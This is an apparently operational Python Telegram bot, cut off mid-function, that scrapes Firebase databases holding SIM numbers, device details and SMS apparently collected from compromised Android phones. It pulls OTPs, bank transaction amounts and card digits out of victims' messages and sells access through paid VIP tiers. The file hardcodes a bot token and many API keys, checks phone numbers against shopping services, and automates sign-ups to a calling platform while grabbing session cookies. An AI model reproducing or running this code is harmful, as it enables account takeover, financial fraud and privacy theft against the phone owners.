#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
  OTP PANEL BOT — VANTAGE PRO + OMNIDIMENSION EDITION       
  RAILWAY ANTI-CRASH OPTIMIZED | GHOST WEB SERVER
  STRICT REFERRAL VERIFICATION | UPI QR & TELEGRAM STARS
  100% STABLE SYNC (NO FREEZE) | UNLIMITED DEVICES LIST
══════════════════════════════════════════════════════
"""

import os
import re
import sys
import time
import json
import random
import string
import asyncio
import logging
import warnings
import traceback
import gc
from collections import deque
from datetime import datetime
from typing import Optional
from http.server import BaseHTTPRequestHandler, HTTPServer
import aiohttp
from aiohttp import web
from urllib.parse import quote_plus
from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup, 
    ReplyKeyboardMarkup, 
    KeyboardButton,
    LabeledPrice
)
from telegram.error import BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    PreCheckoutQueryHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
from playwright.async_api import async_playwright

warnings.filterwarnings("ignore", category=DeprecationWarning)
logging.basicConfig(format='[%(asctime)s] %(levelname)s: %(message)s', level=logging.INFO, datefmt='%Y-%m-%d %H:%M:%S')
logger = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

# ==========================================
# ⚙️ VANTAGE & CONFIGURATION
# ==========================================
VANTAGE_DB = "https://sannn-5d617-default-rtdb.firebaseio.com"
VANTAGE_AUTH = "tHe daRk"

# 🔥 TUMHARA ASLI OMNIDIMENSION TOKEN 🔥
TOKEN = os.getenv("BOT_TOKEN", "8686523764:AAGb0mn8QqtC6Q8DYniy08NiOsxnVr9nC0o")
REFERRAL_CODE = "umd67mpf"
ADMIN_IDS: set[int] = {6860106371}

WAIT_EMAIL, WAIT_OTP, WAIT_PROMPT, WAIT_NUMBER = range(4)

def extract_urls_from_files() -> list:
    extracted_urls = set()
    pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
    current_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else '.'
    for filename in os.listdir(current_dir):
        if (filename.endswith('.json') or filename.endswith('.txt')) and filename not in ['settings.json', 'requirements.txt', 'device_cache.json']:
            filepath = os.path.join(current_dir, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    matches = pattern.findall(content)
                    extracted_urls.update(matches)
            except Exception: pass
    return list(extracted_urls)

RAW_URLS = list(set(extract_urls_from_files()))

DATABASES = {"VANTAGE_MAIN": {"url": VANTAGE_DB, "auth": VANTAGE_AUTH}}
for i, url in enumerate(RAW_URLS):
    if url != VANTAGE_DB:
        DATABASES[f"P_{i}"] = {"url": url, "auth": None}

POLL_INTERVAL   = 10  
CACHE_INTERVAL  = 600 
SMS_LIMIT       = 150  
PAGE_SIZE       = 20
CHUNK_SIZE      = 25

FORCE_JOIN_CHATS = ["@leakmethodfree", "@sabkijayhokhush", "@rosekhudkabanaya"]

BASE_DIR = os.getenv("RAILWAY_VOLUME_MOUNT_PATH", os.path.dirname(os.path.abspath(__file__)))
DB_DIR = os.path.join(BASE_DIR, "Panel_Databases")
USERS_DIR = os.path.join(DB_DIR, "Users")
SYS_DIR = os.path.join(DB_DIR, "System")
SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
CACHE_FILE = os.path.join(SYS_DIR, "permanent_device_cache.json")

seen_ids = deque(maxlen=20000) 
first_run: bool     = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None
start_time = time.time()
total_otps_processed = 0

user_fresh_cache: dict[int, list[str]] = {}
all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  

GLOBAL_DEVICE_CACHE: dict[str, list] = {"ALL": []}
SCAN_PROGRESS = {"scanned": 0, "total": 0, "is_scanning": False}
SETTINGS = {"base_price": 30, "global_panels": []}

API_LOCK = asyncio.Lock()
WORKER_SEMAPHORE = asyncio.Semaphore(50) 

SYS_SETTINGS = {
    "api_keys": [
        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74", "AK_82DbShpWkA6_Ctln35D7d7jOzWOQkJk7",
        "AK_Z67i7aPkuL4Iid7Vq8OgOuJb7ewNZy4K", "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-", "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM", "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6",
        "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x", "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT",
        "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg", "AK_l3KWP5J0l0vpRHV_xMMYqVY9OUGLcIJO",
        "AK_Y6tDZmfylYdDchpsSbyqzu5YuD1bnbNo", "AK_bC4UzJNUG4Yk8TtT3mxqxNJ6oIPLiBfh",
        "AK_BtvAIidv7mzczqKdg-y5-Pw4C9Ri7Pvw", "AK_CphAPpSkMgIKLCzBYZFCt6mN68FgOgq3"
    ],
    "check_anim": "⚡",
    "upi_id": "your_upi_id_here@ybl", # ⚠ CHANGE THIS TO YOUR UPI ID
    "vip_price": 1.00, # Price in Rupees
    "vip_price_stars": 50 # Price in Telegram Stars
}

class Device:
    __slots__ = ("id", "name", "status", "battery", "timestamp", "numbers", "device_info", "sms_path", "base_url", "db_tag", "last_sms_ts", "auth")
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag, last_sms_ts=0.0, auth=None):
        self.id = id; self.name = name; self.status = status; self.battery = battery
        self.timestamp = timestamp; self.numbers = numbers; self.device_info = device_info
        self.sms_path = sms_path; self.base_url = base_url; self.db_tag = db_tag; self.last_sms_ts = last_sms_ts; self.auth = auth
        
    def to_dict(self):
        return {s: getattr(self, s) for s in self.__slots__}
    
    @classmethod
    def from_dict(cls, data):
        return cls(data["id"], data["name"], data["status"], data["battery"], data["timestamp"], data["numbers"], data["device_info"], data["sms_path"], data["base_url"], data["db_tag"], data.get("last_sms_ts", 0.0), data.get("auth"))

# ==========================================
# 🚀 RAILWAY ANTI-CRASH WEB SERVER
# ==========================================
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Bot is Alive and Running on Railway!")
    def log_message(self, format, *args): pass 

def run_health_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    server.serve_forever()

# ==========================================
# 🛠 UTILITIES & CACHE
# ==========================================
def init_dirs():
    os.makedirs(USERS_DIR, exist_ok=True)
    os.makedirs(SYS_DIR, exist_ok=True)
    if not os.path.exists(SMS_LOG_FILE):
        with open(SMS_LOG_FILE, "w", encoding="utf-8") as f: f.write("--- SYSTEM MASTER SMS LOG ---\n")

def load_data():
    global all_users, SETTINGS
    init_dirs()
    
    set_path = os.path.join(SYS_DIR, "settings.json")
    if os.path.exists(set_path):
        try:
            with open(set_path, "r", encoding="utf-8") as f: SETTINGS.update(json.load(f))
        except: pass

    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE, "r", encoding="utf-8") as f:
                cached_data = json.load(f)
                GLOBAL_DEVICE_CACHE["ALL"] = [Device.from_dict(d) for d in cached_data]
            print(f"✅ Restored {len(GLOBAL_DEVICE_CACHE['ALL'])} devices from Permanent Cache.")
        except: pass

    for fname in os.listdir(USERS_DIR):
        if fname.endswith(".json"):
            try:
                uid = int(fname.split(".")[0])
                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f:
                    u = json.load(f)
                    u.setdefault("custom_dbs", [])
                    u.setdefault("referrals", 0)
                    u.setdefault("vip_target", 20) 
                    u.setdefault("wishlist", []) 
                    u.setdefault("coins", 0)
                    u.setdefault("vip_until", 0.0)
                    u.setdefault("verified", False)
                    u.setdefault("pending_ref", None)
                    all_users[uid] = u
            except: pass
                
    for adm in ADMIN_IDS:
        if adm not in all_users:
            all_users[adm] = {"name": "Supreme Owner", "username": "", "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"), "verified": True, "referrals": 0, "vip_target": 20, "wishlist": [], "coins": 999999, "vip_until": 2e10, "custom_dbs": [], "pending_ref": None}
            save_user(adm)

def save_user(uid: int):
    init_dirs()
    if uid in all_users:
        try:
            with open(os.path.join(USERS_DIR, f"{uid}.json"), "w", encoding="utf-8") as f: json.dump(all_users[uid], f, indent=4)
        except: pass

def save_settings():
    init_dirs()
    try:
        with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f: json.dump(SETTINGS, f, indent=4)
    except: pass

def save_device_cache():
    try:
        data = [d.to_dict() for d in GLOBAL_DEVICE_CACHE.get("ALL", [])]
        with open(CACHE_FILE, "w", encoding="utf-8") as f: json.dump(data, f)
    except: pass

async def auto_save_loop():
    while True:
        try:
            await asyncio.sleep(60)
            await asyncio.to_thread(save_settings)
            for uid in list(all_users.keys()): await asyncio.to_thread(save_user, uid)
            gc.collect()
        except: await asyncio.sleep(5)

# ==========================================
# 🛑 STRICT FORCE JOIN SYSTEM
# ==========================================
def get_force_join_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel 1", url="https://t.me/sabkijayhokhush")],
        [InlineKeyboardButton("📢 Join Channel 2", url="https://t.me/leakmethodfree")],
        [InlineKeyboardButton("💬 Join Group", url="https://t.me/rosekhudkabanaya")],
        [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
    ])

async def check_force_join(bot, user_id: int) -> bool:
    if user_id in ADMIN_IDS: return True
    for chat in FORCE_JOIN_CHATS:
        try:
            member = await bot.get_chat_member(chat, user_id)
            if member.status in ['left', 'kicked', 'banned']: return False
        except:
            return False # STRICT: If bot is not admin, deny access.
    return True

# ==========================================
# 🌐 HTTP & FIREBASE API ENGINE
# ==========================================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=150, keepalive_timeout=30, enable_cleanup_closed=True))
    return _http_session

async def fb_get(path: str, base: str, auth: str = None, query: str = "") -> Optional[dict]:
    url = f"{base}/{path}.json" if path else f"{base}/.json"
    params = []
    if auth: params.append(f"auth={quote_plus(auth)}")
    if query: params.append(query)
    if params: url += "?" + "&".join(params)
    try:
        session = await get_http_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status == 200: return await r.json(content_type=None)
    except: pass
    return None

async def fb_keys(path: str, base: str, auth: str = None) -> list[str]:
    url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
    if auth: url += f"&auth={quote_plus(auth)}"
    try:
        session = await get_http_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return list(data.keys()) if isinstance(data, dict) else []
    except: pass
    return []

async def check_number_api(service: str, number: str, retries=3) -> dict:
    async with WORKER_SEMAPHORE: 
        clean_number = re.sub(r"\D", "", str(number))[-10:]
        api_keys = SYS_SETTINGS.get("api_keys", [])
        if not api_keys: return {"status": "error"}
        for attempt in range(retries):
            async with API_LOCK:
                if not hasattr(check_number_api, 'k_idx'): check_number_api.k_idx = 0
                selected_key = api_keys[check_number_api.k_idx % len(api_keys)]
                check_number_api.k_idx += 1
            payload = {"service": service.lower(), "number": clean_number}
            start_req = time.time()
            try:
                session = await get_http_session()
                async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    if r.status == 200: 
                        res = await r.json()
                        res["ms"] = int((time.time() - start_req) * 1000)
                        return res
                    elif r.status == 429: await asyncio.sleep(1.5 * (attempt + 1))
            except: await asyncio.sleep(1)
    return {"status": "error"}

def get_user_dbs(uinfo: dict) -> list:
    valid_urls, now = [], time.time()
    for db in uinfo.get("custom_dbs", []):
        if isinstance(db, str): valid_urls.append({"url": db, "auth": None})
        elif isinstance(db, dict) and db.get("expiry", 0) > now: valid_urls.append({"url": db["url"], "auth": db.get("auth")})
    return valid_urls

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS: return False
    now = time.time()
    if now - user_cooldowns.get(user_id, 0) < 0.3: return True
    user_cooldowns[user_id] = now
    return False

# ==========================================
# 📊 FORMATTERS & MENUS
# ==========================================

OTP_PATTERNS = [re.compile(r"(?:otp|pin|code)[\s\:\-]*(\d{4,8})", re.IGNORECASE), re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), re.compile(r"(?<!\d)(\d{6})(?!\d)"), re.compile(r"(?<!\d)(\d{4})(?!\d)")]
BANK_PATTERNS = [re.compile(r"(debited|credited|deducted|received|spent).*?(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE), re.compile(r"(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?).*?(debited|credited|deducted|received|spent)", re.IGNORECASE), re.compile(r"bal(?:ance)?\s*(?:is|:|-)?\s*(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE)]
CARD_PATTERNS = [re.compile(r"(?:card|a/c|acct)[\s\w]*ending[\s\w]*(\d{4})", re.IGNORECASE), re.compile(r"card.*?(?:\*|x)+(\d{4})", re.IGNORECASE)]

def extract_otp(text: str) -> Optional[str]:
    if not text: return None
    t_lower = text.lower()
    if any(x in t_lower for x in ["block", "rs.", "bal", "balance", "debited", "credited", "alert"]): return None
    for pat in OTP_PATTERNS:
        m = re.search(pat, text)
        if m: return m.group(1)
    return None

def extract_bank_info(text: str) -> Optional[str]:
    if not text: return None
    info = []
    for pat in BANK_PATTERNS:
        m = re.search(pat, text)
        if m:
            groups = m.groups()
            if len(groups) == 2:
                action = groups[0].lower() if groups[0].lower() in ['debited', 'credited', 'deducted', 'received'] else groups[1].lower()
                amt = groups[1] if groups[1].replace('.','').replace(',','').isdigit() else groups[0]
                emoji = "🔴" if action in ['debited', 'deducted', 'spent'] else "🟢"
                info.append(f"{emoji} {action.capitalize()}: ₹{amt}")
            elif len(groups) == 1:
                info.append(f"💰 Balance: ₹{groups[0]}")
    return " | ".join(info) if info else None

def extract_card_info(text: str) -> Optional[str]:
    if not text: return None
    for pat in CARD_PATTERNS:
        m = re.search(pat, text)
        if m: return f"💳 Card: **{m.group(1)}"
    return None

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str], Optional[str]]:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    bank_info = extract_bank_info(body)
    card_info = extract_card_info(body)
    date   = sms_date(sms)
    sender = sms.get("sender") or "Unknown"
    
    lines  = []
    if otp: lines.append(f"🔐 <b>OTP:</b> {otp}")
    if bank_info: lines.append(f"🏦 <b>BANK:</b> {bank_info}")
    if card_info: lines.append(f"{card_info}")
    
    lines.append(f"👤 From: {sender}\n📅 Date: {date}\nNumber: {num_label}\n\n💬 Message: {body}")
    return "\n".join(lines), otp, bank_info

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_bool(val) -> str: return "online" if val is True or str(val).lower() == "online" else "offline"
def parse_status_str(val) -> str: return "online" if str(val).lower() == "online" else "offline"
def bat_emoji(pct: int) -> str: return "🔋" if pct >= 20 else "🪫"
def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c
def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 4: nums.append(fmt_num(val))
    return list(set(nums))

def _format_btn_label(d: Device) -> str:
    icon = "🟢" if d.status == "online" else "🔴"
    if d.numbers:
        main_num = str(d.numbers[0])
        display_num = main_num if main_num.startswith("+") else f"+{main_num}"
        if len(display_num) > 14: display_num = display_num[:13] + "…"
        lbl = f"{icon} {display_num}"
    else: lbl = f"{icon} {d.name[:8]}"
    return lbl

def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
    u = all_users.get(chat_id, {})
    is_admin = chat_id in ADMIN_IDS
    is_vip = time.time() < u.get("vip_until", 0)
    
    keys = [
        [KeyboardButton("🌐 Global Devices List"), KeyboardButton("🔍 Search Number")],
        [KeyboardButton("⭐ My Wishlist"), KeyboardButton("⚡ Auto-Check Panels")],
        [KeyboardButton("🏦 Bank/Cards Scanner"), KeyboardButton("Manual Checker")],
        [KeyboardButton("Add Custom Panel"), KeyboardButton("🎁 Refer & Earn VIP")],
        [KeyboardButton("💳 Buy VIP (UPI/QR)"), KeyboardButton("💎 Buy VIP (Stars)")]
    ]
    if is_admin: keys.append([KeyboardButton("Admin Panel")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def device_list_header(devices: list[Device], page: int = 0, title="OTP PANEL PRO") -> str:
    online  = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    sync_status = ""
    if scan_progress.get("is_scanning"):
        scanned = scan_progress.get("scanned", 0)
        total = scan_progress.get("total", 0)
        pct = int((scanned/total)*100) if total > 0 else 0
        sync_status = f"\n⚠️ **Live Syncing:** {scanned}/{total} DBs loaded ({pct}%)..."
    return f"{title}\n━━━━━━━━━━━━━━━━━━\nOnline: {online}   Offline: {offline}\nTotal: {len(devices)} Devices\nPage {page + 1} of {total_pages}{sync_status}\n━━━━━━━━━━━━━━━━━━\nSelect a number below:"

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * PAGE_SIZE
    page_devs = devices[start : start + PAGE_SIZE]
    rows = []
    for d in page_devs: rows.append([InlineKeyboardButton(_format_btn_label(d), callback_data=f"sel:{d.id}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("🔄 Refresh List", callback_data="home"), InlineKeyboardButton("Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online[:50]: rows.append([InlineKeyboardButton(_format_btn_label(d), callback_data=f"sel:{d.id}")])
    else: rows.append([InlineKeyboardButton("No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("Refresh", callback_data="online"), InlineKeyboardButton("All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def get_checker_menu(prefix="chk_srv:"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🥬 Bigbasket", callback_data=f"{prefix}bigbasket"), InlineKeyboardButton("🛍️ Meesho", callback_data=f"{prefix}meesho"), InlineKeyboardButton("🪐 Plutos", callback_data=f"{prefix}plutos")],
        [InlineKeyboardButton("⭐ Starexch", callback_data=f"{prefix}starexch"), InlineKeyboardButton("🍔 Swiggy", callback_data=f"{prefix}swiggy"), InlineKeyboardButton("🛒 Flipkart", callback_data=f"{prefix}flipkart")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

async def safe_edit(query, text, reply_markup=None, parse_mode=None, disable_web_page_preview=False):
    try: await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
    except BadRequest: pass
    except Exception: pass

# ==========================================
# 🔥 NEVER STUCK SYNC ENGINE (15s KILL SWITCH)
# ==========================================
async def fetch_db_data_task(tag: str, url: str, auth: str, results_list: list):
    try:
        devices_list = []
        added_set = set()
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url, auth), fb_get("All_Users/simDetails", url, auth), fb_get("All_Users/Data/DeviceInfo", url, auth),
            fb_get("user_data", url, auth), fb_get("clients", url, auth)
        )
            
        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                info = info_all.get(dev_id) or {}
                nums = extract_all_nums(sim, info)
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
        
        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set: continue
                if not isinstance(data, dict): continue
                added_set.add(dev_id)
                nums = extract_all_nums(data)
                devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
        
        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set: continue
                if not isinstance(client, dict): continue
                sim_list = client.get("sims", [])
                s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
                s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
                nums = extract_all_nums(client, s1, s2)
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}", sms_path=f"messages/{dev_id}", base_url=url, db_tag=tag))
                
        if devices_list: results_list.extend(devices_list)
    except Exception: pass

async def safe_fetch_wrapper(tag: str, config: dict, results_list: list):
    try:
        # 🔥 FIX: Strict 15 Second Kill-Switch per URL to prevent hang
        await asyncio.wait_for(fetch_db_data_task(tag, config["url"], config.get("auth"), results_list), timeout=15.0)
    except Exception: pass
    finally: scan_progress["scanned"] += 1

async def _update_global_cache():
    global scan_progress
    dbs_to_poll = dict(DATABASES)
    for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
        if isinstance(g_url, str): dbs_to_poll[f"G_{i}"] = {"url": g_url, "auth": None}
        else: dbs_to_poll[f"G_{i}"] = g_url

    items = list(dbs_to_poll.items())
    scan_progress["total"] = len(items)
    scan_progress["scanned"] = 0
    scan_progress["is_scanning"] = True
    
    existing_devices = {d.id: d for d in GLOBAL_DEVICE_CACHE.get("ALL", [])}
    
    for i in range(0, len(items), CHUNK_SIZE):
        chunk = items[i:i + CHUNK_SIZE]
        results_list = []
        tasks = [safe_fetch_wrapper(tag, config, results_list) for tag, config in chunk]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        for d in results_list: existing_devices[d.id] = d
            
        unique_devices = list(existing_devices.values())
        unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
        
        # 🔥 FIX: No Hard Capping (10,000+ limit allowed)
        GLOBAL_DEVICE_CACHE["ALL"] = unique_devices 
        
        if (i // CHUNK_SIZE) % 3 == 0: save_device_cache()
        del results_list
        gc.collect()
        await asyncio.sleep(0.5) 
        
    scan_progress["is_scanning"] = False
    save_device_cache()

async def global_cache_loop():
    while True:
        try: await _update_global_cache()
        except Exception: pass
        await asyncio.sleep(120) 

async def get_all_devices(chat_id: int = 0) -> list[Device]:
    uinfo = all_users.get(chat_id, {})
    is_vip = uinfo.get("vip_until", 0) > time.time()
    is_admin = chat_id in ADMIN_IDS
    custom_dbs = get_user_dbs(uinfo)
    
    all_cached = GLOBAL_DEVICE_CACHE.get("ALL", [])
    
    if is_admin or is_vip:
        return all_cached
    else:
        valid_tags = set()
        for i, _ in enumerate(custom_dbs): valid_tags.add(f"U_{chat_id}_{i}")
        return [d for d in all_cached if d.db_tag in valid_tags]

async def get_device_sms(device: Device, limit: int = 15) -> list[dict]:
    try:
        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=30"
        data = await fb_get("", url, timeout=5)
        if not data or not isinstance(data, dict): return []
        entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
        for s in entries:
            try:
                s["_parsed_ts"] = float(s.get("timestamp", 0))
                if s["_parsed_ts"] > 1e11: s["_parsed_ts"] /= 1000
            except: s["_parsed_ts"] = 0.0
        entries.sort(key=lambda s: s["_parsed_ts"], reverse=True)
        return entries[:limit]
    except: return []

# ==========================================
# 🤖 PLAYWRIGHT OMNIDIMENSION CALL ENGINE
# ==========================================
async def initiate_call(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not (chat_id in ADMIN_IDS or all_users.get(chat_id, {}).get("vip_until", 0) > time.time()):
        await update.message.reply_text("❌ This feature is for VIP users only.")
        return ConversationHandler.END
    await update.message.reply_text("📧 <b>OmniDimension Call Setup - Step 1:</b>\nApna Email Address bhejein OTP ke liye:", parse_mode="HTML")
    return WAIT_EMAIL

async def process_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()
    wait_msg = await update.message.reply_text("⏳ Opening Auto-Chrome & Loading Page (Please wait up to 60s)...")
    password = generate_random_string(10) + "A1!"
    phone = generate_random_phone()
    name = generate_random_string(6)
    context.user_data['email'], context.user_data['password'] = email, password
    try:
        playwright = await async_playwright().start()
        context.user_data['playwright'] = playwright
        browser = await playwright.chromium.launch(headless=True) 
        context.user_data['browser'] = browser
        context.user_data['context'] = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
        page = await context.user_data['context'].new_page()
        context.user_data['page'] = page
        
        await page.goto(f"https://omnidim.io/signup?ref={REFERRAL_CODE}", wait_until="domcontentloaded", timeout=60000)
        await page.locator('input[type="text"], input[name="name"]').first.fill(name, timeout=15000)
        await page.locator('input[type="email"], input[name="email"]').first.fill(email)
        await page.locator('input[type="tel"], input[name="phone"]').first.fill(phone)
        await page.locator('input[type="password"], input[name="password"]').first.fill(password)
        try: await page.locator('input[type="checkbox"]').first.check(timeout=2000)
        except: pass 
        await asyncio.sleep(1) 
        await page.locator('input[type="password"], input[name="password"]').first.press("Enter")
        try: await page.locator('button[type="submit"]').first.click(timeout=3000, force=True)
        except: pass
        await wait_msg.edit_text(f"✅ Auto-Chrome ne form bhar diya!\nOTP sent to <b>{email}</b>!\n\n📩 <b>Step 2:</b> Kripya OTP bhejein:", parse_mode="HTML")
        return WAIT_OTP
    except Exception as e:
        await wait_msg.edit_text(f"❌ <b>Browser Automation Error:</b>\n{str(e)[:200]}", parse_mode="HTML")
        return ConversationHandler.END

async def process_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    page = context.user_data.get('page')
    browser = context.user_data.get('browser')
    wait_msg = await update.message.reply_text("⏳ Auto-Chrome me OTP enter kar rahe hain aur Session Token chura rahe hain...")
    try:
        await page.locator('input[name="otp"], input[type="text"], input[type="number"]').last.fill(otp, timeout=15000) 
        await page.locator('button[type="submit"]').first.click()
        await asyncio.sleep(5) 
        cookies = await page.context.cookies()
        session_id = next((c['value'] for c in cookies if c['name'] == 'session_id'), None)
        if not session_id:
            await wait_msg.edit_text("❌ Signup failed in browser. Session ID not found. OTP galat ho sakta hai.", parse_mode="HTML")
            await browser.close()
            return ConversationHandler.END
        context.user_data['session_id'] = session_id
        await browser.close() 
        success_text = f"🎉 <b>ACCOUNT CREATED & COOKIE SECURED!</b>\n━━━━━━━━━━━━━━━━━━\n📧 Email: <code>{context.user_data['email']}</code>\n🔑 Pass: <code>{context.user_data['password']}</code>\n━━━━━━━━━━━━━━━━━━\n\n💬 <b>Step 3:</b> AI Agent ke liye Prompt bhejein (Call par kya bolna hai):"
        await wait_msg.edit_text(success_text, parse_mode="HTML")
        return WAIT_PROMPT
    except Exception as e:
